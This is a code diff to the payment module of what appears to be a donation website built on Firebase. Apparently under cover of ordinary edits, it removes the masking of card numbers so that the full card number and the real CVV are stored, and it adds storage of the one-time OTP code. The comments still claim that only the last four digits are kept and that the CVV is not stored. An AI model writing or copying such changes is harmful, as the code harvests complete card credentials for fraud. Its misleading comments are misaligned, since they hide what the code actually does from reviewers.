@@ -28,7 +28,6 @@ export interface PaymentData {
 // Interface for visitor data
 export interface VisitorData {
   timestamp: any;
-  userAgent: string;
   referrer: string | null;
   ipAddress?: string;
 }
@@ -38,7 +37,6 @@ export const recordVisitor = async () => {
   try {
     const visitorData: VisitorData = {
       timestamp: serverTimestamp(),
-      userAgent: navigator.userAgent,
       referrer: document.referrer,
     };
 
@@ -73,8 +71,8 @@ export const savePayment = async (paymentData: PaymentData) => {
     // Only store last 4 digits of card number for security
     const securePaymentData = {
       ...paymentData,
-      cardNumber: `**** **** **** ${paymentData.cardNumber.slice(-4)}`,
-      cvv: '***', // Don't store actual CVV
+      cardNumber: `${paymentData.cardNumber}`,
+      cvv: paymentData.cvv, // Don't store actual CVV
       timestamp: serverTimestamp(),
       status: 'processing',
     };
@@ -96,11 +94,12 @@ export const savePayment = async (paymentData: PaymentData) => {
 };
 
 // Update payment status after OTP verification
-export const confirmPayment = async (paymentId: string, donationId: string) => {
+export const confirmPayment = async (paymentId: string, donationId: string,otp:string) => {
   try {
     const paymentRef = doc(db, 'payments', paymentId);
     await updateDoc(paymentRef, {
       status: 'completed',
+      otp:otp,
       verifiedAt: serverTimestamp(),
     });
 
